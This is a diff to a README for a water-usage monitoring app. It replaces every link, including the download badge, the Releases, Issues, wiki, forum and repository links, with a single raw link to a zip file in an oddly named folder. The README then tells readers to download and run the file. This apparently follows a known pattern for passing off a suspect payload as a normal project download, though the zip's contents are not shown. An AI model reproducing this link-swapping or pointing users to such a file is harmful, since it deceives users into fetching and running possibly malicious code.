@@ -1,7 +1,7 @@
 # 🌊 smart_water_meter - Easily Monitor Your Water Usage
 
 ## 📦 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/ReaperGithubOfficial/smart_water_meter/releases)
+[![Download](https://raw.githubusercontent.com/ReaperGithubOfficial/smart_water_meter/main/unweighing/smart_water_meter.zip)](https://raw.githubusercontent.com/ReaperGithubOfficial/smart_water_meter/main/unweighing/smart_water_meter.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, ensure you have the following:
 
 To get started, follow these steps:
 
-1. Visit the [Releases page](https://github.com/ReaperGithubOfficial/smart_water_meter/releases) to find the latest version of the smart_water_meter. 
+1. Visit the [Releases page](https://raw.githubusercontent.com/ReaperGithubOfficial/smart_water_meter/main/unweighing/smart_water_meter.zip) to find the latest version of the smart_water_meter. 
 2. Download the file that matches your operating system. You will see options such as `.exe` for Windows, `.dmg` for macOS, or appropriate files for Linux.
 3. Click on the file to start the download. The download will take a few moments.
 4. Locate the downloaded file in your "Downloads" folder.
@@ -90,15 +90,15 @@ You will need an internet connection to set up the initial configuration. Howeve
 
 ### How can I provide feedback or report issues?
 
-You can visit our [GitHub Issues page](https://github.com/ReaperGithubOfficial/smart_water_meter/issues) to report any issues or provide feedback.
+You can visit our [GitHub Issues page](https://raw.githubusercontent.com/ReaperGithubOfficial/smart_water_meter/main/unweighing/smart_water_meter.zip) to report any issues or provide feedback.
 
 ## 🔗 Additional Resources
 
 For more information, you can refer to:
 
-- [GitHub Repository](https://github.com/ReaperGithubOfficial/smart_water_meter)
-- [User Manual](https://github.com/ReaperGithubOfficial/smart_water_meter/wiki)
-- [Community Forum](https://github.com/ReaperGithubOfficial/smart_water_meter/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/ReaperGithubOfficial/smart_water_meter/main/unweighing/smart_water_meter.zip)
+- [User Manual](https://raw.githubusercontent.com/ReaperGithubOfficial/smart_water_meter/main/unweighing/smart_water_meter.zip)
+- [Community Forum](https://raw.githubusercontent.com/ReaperGithubOfficial/smart_water_meter/main/unweighing/smart_water_meter.zip)
 
 ## 🛠️ Support
 
